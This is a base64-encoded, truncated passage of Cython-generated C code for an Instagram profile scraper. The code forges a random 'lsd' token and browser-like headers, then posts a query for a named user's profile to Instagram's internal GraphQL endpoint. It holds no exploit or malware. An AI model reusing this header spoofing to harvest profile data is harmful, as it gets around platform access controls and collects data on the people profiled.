gICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nob2ljZXMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzODYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CgogICAgICAKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdHJpbmcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzODcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXNjaWlfbGV0dGVycyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAzODcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0cmluZyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM4NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kaWdpdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMzg3LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgX19weXhfdF8xID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfMTEsIF9fcHl4X3RfMTIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzODcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgX19weXhfdF8zID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHsKICAgICAgICBfX3B5eF90XzggPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzcpOwogICAgICAgIGFzc2VydChfX3B5eF90XzgpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF84KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzMgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDEgOiAwKV0gPSB7X19weXhfdF84LCBfX3B5eF90XzF9OwogICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMzg2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7CiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzMyLCBfX3B5eF90XzEyLCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4NiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19weXhfdF8yID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKF9fcHl4X3RfNywgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKF9fcHl4X3RfMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpLCBfX3B5eF90XzEyKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzODYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgICB9CgogICAgICAKICAgICAgX19weXhfdF83ID0gUHlVbmljb2RlX0pvaW4oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8sIF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM4NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgX19weXhfdl9sc2RfdG9rZW4gPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpOwogICAgICBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxMCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWNjZXB0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYWNjZXB0X2xhbmd1YWdlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2VuX2VuX1VTX3FfMF85KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfY29udGVudF90eXBlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlXzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzg5LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RudCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcmlnaW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMzg5LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ByaW9yaXR5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3VfMV9pKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWZlcmVyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX3d3d19pbnN0YWdyYW1fY29tX2NyaXN0aWFuKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4OSwgX19weXhfTDNfZXJyb3IpCgogICAgICAKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91c2VyX2FnZW50LCBfX3B5eF92X3VzZXJfYWdlbnQpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzg5LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV94X2ZiX2ZyaWVuZGx5X25hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Qb2xhcmlzVXNlckhvdmVyQ2FyZENvbnRlbnRWMlF1ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzODksIF9fcHl4X0wzX2Vycm9yKQoKICAgICAgCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfeF9mYl9sc2QsIF9fcHl4X3ZfbHNkX3Rva2VuKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fcHl4X3ZfaGVhZGVycyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MDEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2xzZCwgX19weXhfdl9sc2RfdG9rZW4pIDwgKDApKSBfX1BZWF9FUlIoMCwgNDAxLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZiX2FwaV9jYWxsZXJfY2xhc3MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SZWxheU1vZGVybikgPCAoMCkpIF9fUFlYX0VSUigwLCA0MDEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUG9sYXJpc1VzZXJIb3ZlckNhcmRDb250ZW50VjJRdWUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDAxLCBfX3B5eF9MM19lcnJvcikKCiAgICAgIAogICAgICBfX3B5eF90XzEyID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZHVtcHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VySUQsIF9fcHl4X3ZfdXNlcl9pZCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MDQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcm5hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jcmlzdGlhbm8pIDwgKDApKSBfX1BZWF9FUlIoMCwgNDA0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19weXhfdF8zID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF84KSkpIHsKICAgICAgICBfX3B5eF90XzEyID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF84KTsKICAgICAgICBhc3NlcnQoX19weXhfdF8xMik7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEyKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfOCwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzMgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTIsIF9fcHl4X3RfMX07CiAgICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF84LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQwNCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIH0KICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ZhcmlhYmxlcywgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQwMSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VydmVyX3RpbWVzdGFtcHMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90cnVlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQwMSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kb2NfaWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfNzcxNzI2OTQ4ODMzNjAwMSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MDEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpOwogICAgICBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMiA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MDgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wb3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDA4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMyA9IDE7CiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMSkpKSB7CiAgICAgICAgX19weXhfdF8yID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xKTsKICAgICAgICBhc3NlcnQoX19weXhfdF8yKTsKICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMSk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzEsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19weXhfdF8zID0gMDsKICAgICAgfQogICAgICAjZW5kaWYKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAzIDogMCldID0ge19fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc193d3dfaW5zdGFncmFtX2NvbV9hcGlfZ3JhcH07CiAgICAgICAgX19weXhfdF84ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDA4LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MDgsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3ZfZGF0YSwgX19weXhfdF84LCBfX3B5eF9jYWxsYXJncysyLCAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQwOCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZW91dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwLCBfX3B5eF90XzgsIF9fcHl4X2NhbGxhcmdzKzIsIDIpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDA4LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF8xLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgyLV9fcHl4X3RfMykgfCAoX19weXhfdF8zKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfOCk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQwOCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIH0KICAgICAgX19weXhfdl9yZXNwb25zZSA9IF9fcHl4X3RfNzsKICAgICAgX19weXhfdF83ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzExID0gX19weXhfdl9yZXNwb25zZTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpOwogICAgICBfX3B5eF90XzMgPSAwOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTEsIE5VTEx9OwogICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMS1fX3B5eF90XzMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDQxMCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICB9CiAgICAgIF9fcHl4X3RfMiA9IF9fcHl4X3RfMTI7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpOwogICAgICBfX3B5eF90XzExID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNDEwLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICBfX3B5eF90XzMgPSAwOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3RfMTF9OwogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDMtX19weXhfdF8zKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDEwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgfQogICAgICBfX3B5eF90XzEgPSBfX3B5eF90Xzg7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpOwogICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgNDEwLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICBfX3B5eF90XzMgPSAwOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXIsIF9fcHl4X3RfMTJ9OwogICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDMtX19weXhfdF8zKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQxMCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIH0KICAgICAgX19weXhfdl91c2VyX2luZm8gPSBfX3B5eF90Xzc7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3VzZXJfaW5mbywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXh